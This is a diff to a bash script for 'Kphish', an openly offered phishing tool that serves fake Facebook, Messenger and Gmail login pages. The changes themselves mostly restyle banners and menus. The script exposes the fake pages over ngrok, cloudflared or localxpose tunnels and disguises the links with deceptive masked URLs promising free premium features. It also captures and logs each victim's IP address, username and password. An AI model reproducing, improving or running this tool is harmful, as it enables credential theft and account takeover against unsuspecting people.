@@ -82,12 +82,15 @@ kill_pid() {
 banner() {
 	cat <<- EOF
 
-		${GREEN}░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░██╗░░██╗██╗░██████╗██╗░░██╗███████╗██████╗░
-		${GREEN}██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗██║░░██║██║██╔════╝██║░░██║██╔════╝██╔══██╗
-		${GREEN}███████║██║░░░██║░░░██║░░░██║░░██║██████╔╝███████║██║╚█████╗░███████║█████╗░░██████╔╝
-		${GREEN}██╔══██║██║░░░██║░░░██║░░░██║░░██║██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██╔══╝░░██╔══██╗
-		${GREEN}██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝██║░░░░░██║░░██║██║██████╔╝██║░░██║███████╗██║░░██║
-		${GREEN}╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
+		${GREEN}
+		  _  __      _     _     _     
+		 | |/ /     | |   (_)   | |    
+		 | ' / _ __ | |__  _ ___| |__  
+		 |  < | '_ \| '_ \| / __| '_ \ 
+		 | . \| |_) | | | | \__ \ | | |
+		 |_|\_\ .__/|_| |_|_|___/_| |_|
+		      | |                      
+		      |_|                      
 		${GREEN}
 		                                    ${BLUE}Version : ${__version__}
 
@@ -98,10 +101,16 @@ banner() {
 ## Small Banner
 banner_small() {
 	cat <<- EOF
-		${BLUE}█████████████████████████████████████████████████████████████
-		${BLUE}██▀▄─██▄─██─▄█─▄─▄─█─▄▄─█▄─▄▄─█─█─█▄─▄█─▄▄▄▄█─█─█▄─▄▄─█▄─▄▄▀█
-		${BLUE}██─▀─███─██─████─███─██─██─▄▄▄█─▄─██─██▄▄▄▄─█─▄─██─▄█▀██─▄─▄█
-		${BLUE}▀▄▄▀▄▄▀▀▄▄▄▄▀▀▀▄▄▄▀▀▄▄▄▄▀▄▄▄▀▀▀▄▀▄▀▄▄▄▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀▄▄▀▄▄▀    ${WHITE} ${__version__}
+		${GREEN}
+		  _  __      _     _     _     
+		 | |/ /     | |   (_)   | |    
+		 | ' / _ __ | |__  _ ___| |__  
+		 |  < | '_ \| '_ \| / __| '_ \ 
+		 | . \| |_) | | | | \__ \ | | |
+		 |_|\_\ .__/|_| |_|_|___/_| |_|
+		      | |                      
+		      |_|                      
+		   ${BLUE} ${__version__}
 	EOF
 }
 
@@ -246,7 +255,7 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}MD Asif Hasan${RED}[ ${ORANGE}DetaSploit ${RED}]
+		${GREEN} Author   ${RED}:  ${ORANGE}MD Asif Hasan ${RED}[ ${ORANGE}DetaSploit ${RED}]
 		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/DetaSploit/Kphish
 		${GREEN} Social   ${RED}:  ${CYAN}https://facebook.com/DetaSploit
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
@@ -261,7 +270,7 @@ about() {
 
 	EOF
 
-	read -p "${WHITE}[${GREEN}-${WHITE}]${BLUE} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 : ${BLUE}"
+	read -p "${GREEN}[${ORANGE}•${GREEN}]${BLUE} Select Option : ${BLUE}"
 	case $REPLY in 
 		99)
 			msg_exit;;
@@ -290,8 +299,8 @@ setup_site() {
 capture_ip() {
 	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
 	IFS=$'\n'
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Victim's IP : ${BLUE}$IP"
-	echo -ne "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
+	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Victim's IP : ${BLUE}$IP"
+	echo -ne "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
 	cat .server/www/ip.txt >> auth/ip.txt
 }
 
@@ -300,25 +309,25 @@ capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
 	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
 	IFS=$'\n'
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Account : ${ORANGE}$ACCOUNT"
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Password: ${ORANGE}$PASSWORD"
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
+	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Account : ${ORANGE}$ACCOUNT"
+	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Password: ${ORANGE}$PASSWORD"
+	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
 	cat .server/www/usernames.txt >> auth/usernames.dat
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+	echo -ne "\n${RED}[${ORANGE}•${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to Exit. "
 }
 
 ## Print data
 capture_data() {
-	echo -ne "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Waiting for Login Info, ${ORANGE}Ctrl + C ${BLUE}to exit..."
+	echo -ne "\n${RED}[${ORANGE}•${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to Exit."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
-			echo -e "\n\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Victim IP Found !"
+			echo -e "\n\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Victim IP Found!"
 			capture_ip
 			rm -rf .server/www/ip.txt
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
-			echo -e "\n\n${WHITE}[${GREEN}-${WHITE}]${ORANGE} Login info Found !!"
+			echo -e "\n\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Login info Found!"
 			capture_creds
 			rm -rf .server/www/usernames.txt
 		fi
@@ -328,12 +337,12 @@ capture_data() {
 
 ## Start ngrok
 start_ngrok() {
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	read -n1 -p "${RED}[${ORANGE}•${RED}]${ORANGE} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
 	[[ ${opinion,,} == "y" ]] && ngrok_region="eu" || ngrok_region="us"
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+	echo -e "\n\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Launching Ngrok..."
 
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
@@ -344,17 +353,17 @@ start_ngrok() {
 	{ sleep 8; clear; banner_small; }
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
 	ngrok_url1=${ngrok_url#https://}
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} URL 1 : ${ORANGE}$ngrok_url"
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} URL 2 : ${ORANGE}$mask@$ngrok_url1"
+	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Ngrok Url : ${ORANGE}$ngrok_url"
+	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Masked Url : ${ORANGE}$mask@$ngrok_url1"
 	capture_data
 }
 
 ## Start Cloudflared
 start_cloudflared() { 
     rm .cld.log > /dev/null 2>&1 &
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Initializing... ${ORANGE}( ${CYAN}http://$HOST:$PORT ${ORANGE})"
+	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Initializing... ${ORANGE}( ${CYAN}http://$HOST:$PORT ${ORANGE})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Launching Cloudflared..."
+	echo -ne "\n\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Launching Cloudflared..."
 
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
@@ -366,8 +375,8 @@ start_cloudflared() {
 	
 	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
 	cldflr_link1=${cldflr_link#https://}
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} URL 1 : ${ORANGE}$cldflr_link"
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} URL 2 : ${ORANGE}$mask@$cldflr_link1"
+	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Cloudflared Url : ${ORANGE}$cldflr_link"
+	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Masked Url : ${ORANGE}$mask@$cldflr_link1"
 	capture_data
 }
 
@@ -377,11 +386,11 @@ localxpose_auth() {
 	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
 
 	[ "$(./.server/loclx account status | grep Error)" ] && {
-		echo -e "\n\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+		echo -e "\n\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Create an Account on ${ORANGE}Localxpose.io${GREEN} & Copy the Token\n"
 		sleep 3
-		read -p "${WHITE}[${GREEN}-${WHITE}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
+		read -p "${GREEN}[${ORANGE}•${GREEN}]${BLUE} Input Loclx Token :${ORANGE} " loclx_token
 		[[ $loclx_token == "" ]] && {
-			echo -e "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
+			echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} You Have to Input Localxpose Token." ; sleep 2 ; tunnel_menu
 		} || {
 			echo -n "$loclx_token" > $auth_f 2> /dev/null
 		}
@@ -390,12 +399,12 @@ localxpose_auth() {
 
 ## Start LocalXpose (Again...)
 start_loclx() {
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Initializing... ${CYAN}( ${ORANGE}http://$HOST:$PORT ${CYAN})"
+	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Initializing... ${CYAN}( ${ORANGE}http://$HOST:$PORT ${CYAN})"
 	{ sleep 1; setup_site; localxpose_auth; }
 	echo -e "\n"
-	read -n1 -p "${WHITE}[${GREEN}-${WHITE}]${BLUE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	read -n1 -p "${GREEN}[${ORANGE}•${GREEN}]${BLUE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
-	echo -e "\n\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Launching LocalXpose..."
+	echo -e "\n\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Launching LocalXpose..."
 
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
@@ -405,17 +414,17 @@ start_loclx() {
 
 	{ sleep 12; clear; banner_small; }
 	loclx_url=$(cat .server/.loclx | grep -Eo '[-0-9a-z]+.[-0-9a-z]+(.loclx.io)') # Somebody fix this crappy regex :(
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} URL 1 : ${ORANGE}http://$loclx_url"
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} URL 2 : ${ORANGE}$mask@$loclx_url"
+	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Loclx Url : ${ORANGE}http://$loclx_url"
+	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Masked Url : ${ORANGE}$mask@$loclx_url"
 	capture_data
 }
 
 ## Start localhost
 start_localhost() {
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Initializing... ${GREEN}( ${ORANGE}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Initializing... ${GREEN}( ${ORANGE}http://$HOST:$PORT ${GREEN})"
 	setup_site
 	{ sleep 1; clear; banner_small; }
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Successfully Hosted at : ${GREEN}${ORANGE}http://$HOST:$PORT ${GREEN}"
+	echo -e "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Successfully Hosted at : ${GREEN}${ORANGE}http://$HOST:$PORT ${GREEN}"
 	capture_data
 }
 
@@ -424,14 +433,14 @@ tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
-		${WHITE}[${GREEN}01${WHITE}]${BLUE} Localhost
-		${WHITE}[${GREEN}02${WHITE}]${BLUE} Ngrok.io     ${WHITE}[${ORANGE}Account Needed${WHITE}]
-		${WHITE}[${GREEN}03${WHITE}]${BLUE} Cloudflared  ${WHITE}[${ORANGE}Auto Detects${WHITE}]
-		${WHITE}[${GREEN}04${WHITE}]${BLUE} LocalXpose   ${WHITE}[${ORANGE}NEW! Max 15Min${WHITE}]
+		${GREEN}[${ORANGE}•${GREEN}]${BLUE} Localhost―――1
+		${GREEN}[${ORANGE}•${GREEN}]${BLUE} Ngrok―――2     ${GREEN}[${ORANGE}Account Needed${GREEN}]
+		${GREEN}[${ORANGE}•${GREEN}]${BLUE} Cloudflared―――3  ${GREEN}[${ORANGE}Auto Detects${GREEN}]
+		${GREEN}[${ORANGE}•${GREEN}]${BLUE} LocalXpose―――4   ${GREEN}[${ORANGE}NEW! Max 15Min${GREEN}]
 
 	EOF
 
-	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼 𝙋𝙊𝙍𝙏 𝙁𝙊𝙍𝙒𝘼𝙍𝘿𝙄𝙉𝙂 𝙎𝙀𝙍𝙑𝙄𝘾𝙀 : ${RED}"
+	read -p "${GREEN}[${ORANGE}•${GREEN}]${RED} Select Port Forwarding Service : ${RED}"
 
 	case $REPLY in 
 		1 | 01)
@@ -443,7 +452,7 @@ tunnel_menu() {
 		4 | 04)
 			start_loclx;;
 		*)
-			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
+			echo -ne "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
 	esac
 }
@@ -452,12 +461,12 @@ tunnel_menu() {
 site_facebook() {
 	cat <<- EOF
 
-		${WHITE}[${GREEN}01${WHITE}]${BLUE} Traditional Login Page
-		${WHITE}[${GREEN}04${WHITE}]${BLUE} Facebook Messenger Login Page
+		${GREEN}[${ORANGE}1${GREEN}]${BLUE} Facebook Login Page
+		${GREEN}[${ORANGE}2${GREEN}]${BLUE} Messenger Login Page
 
 	EOF
 
-	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 : ${RED}"
+	read -p "${GREEN}[${ORANGE}•${GREEN}]${RED} Select Option : ${RED}"
 
 	case $REPLY in 
 		1 | 01)
@@ -469,7 +478,7 @@ site_facebook() {
 			mask='http://get-messenger-premium-features-free'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
+			echo -ne "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Invalid Option, Try Again..."
 			{ sleep 1; clear; banner_small; site_facebook; };;
 	esac
 }
@@ -480,12 +489,12 @@ site_facebook() {
 site_gmail() {
 	cat <<- EOF
 
-		${WHITE}[${GREEN}01${WHITE}]${BLUE} Gmail Old Login Page
-		${WHITE}[${GREEN}02${WHITE}]${BLUE} Gmail New Login Page
+		${GREEN}[${ORANGE}1${GREEN}]${BLUE} Gmail Old Login Page
+		${GREEN}[${ORANGE}2${GREEN}]${BLUE} Gmail New Login Page
 
 	EOF
 
-	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 : ${RED}"
+	read -p "${GREEN}[${ORANGE}•${GREEN}]${RED} Select Option : ${RED}"
 
 	case $REPLY in 
 		1 | 01)
@@ -497,7 +506,7 @@ site_gmail() {
 			mask='http://get-unlimited-google-drive-free'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
+			echo -ne "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Invalid Option, Try Again..."
 			{ sleep 1; clear; banner_small; site_gmail; };;
 	esac
 }
@@ -508,31 +517,32 @@ site_gmail() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${WHITE}[${GREEN}::${WHITE}]${BLUE} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉𝙔 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙊𝙍 𝙔𝙊𝙐𝙍 𝙑𝙄𝘾𝙏𝙄𝙈 ${WHITE}[${GREEN}::${WHITE}]${BLUE}
+		${WHITE}[${GREEN}::${WHITE}]${BLUE} Kphish : Simple Facebook & Gmail Phishing Tool ${WHITE}[${GREEN}::${WHITE}]${BLUE}
 
-		${WHITE}[${GREEN}::${WHITE}]${RED} 𝙋𝙃𝙄𝙎𝙃𝙄𝙉𝙂-𝙈𝙊𝘿𝙐𝙇𝙀𝙎: ${WHITE}[${GREEN}::${WHITE}]${RED}
+		${WHITE}[${GREEN}::${WHITE}]${RED} Phishing Sites : ${WHITE}[${GREEN}::${WHITE}]${RED}
 
-		${WHITE}[${GREEN}01${WHITE}]${BLUE} Facebook             ${WHITE}[${GREEN}02${WHITE}]${BLUE} Google
-		
-		${WHITE}[${GREEN}99${WHITE}]${BLUE} About         ${WHITE}[${GREEN}00${WHITE}]${BLUE} Exit
+		${GREEN}[${ORANGE}•${GREEN}]${BLUE} Facebook―――1
+		${GREEN}[${ORANGE}•${GREEN}]${BLUE} Gmail―――2
+		${GREEN}[${ORANGE}•${GREEN}]${BLUE} About―――3
+		${GREEN}[${ORANGE}•${GREEN}]${BLUE} Exit―――4
 
 	EOF
 	
-	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 : ${RED}"
+	read -p "${GREEN}[${ORANGE}•${GREEN}]${RED} Select Option : ${RED}"
 
 	case $REPLY in 
 		1 | 01)
 			site_facebook;;
-		3 | 02)
+		2 | 02)
 			site_gmail;;
 
 
-		99)
+		3 | 03)
 			about;;
-		0 | 00 )
+		4 | 04)
 			msg_exit;;
 		*)
-			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
+			echo -ne "\n${GREEN}[${ORANGE}•${GREEN}]${BLUE} Invalid Option, Try Again..."
 			{ sleep 1; main_menu; };;
 	
 	esac
